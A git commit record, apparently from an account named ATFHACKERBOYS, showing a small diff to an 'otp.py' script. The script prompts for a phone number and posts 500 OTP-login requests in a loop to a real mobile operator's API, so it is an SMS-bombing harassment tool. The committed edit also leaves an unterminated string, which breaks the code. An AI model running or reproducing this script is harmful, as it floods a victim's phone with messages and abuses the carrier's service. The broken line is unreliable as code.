9419f4602354ad84da63744e146186bc9d8ecb9d
ATFHACKERBOYS <84493035+ATFHACKERBOYS@users.noreply.github.com>
2021-05-20 11:48:40 +0600

    Update otp.py

--- otp.py
+++ otp.py
@@ -3,7 +3,7 @@ import requests
 # post
 number=str(input("Enter Your number:"))
 myblapi="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
-data={"mobile":+number}
+data={"mobile":'+number}
 
 for i in range(500):
 	requests.post(myblapi,data=data)
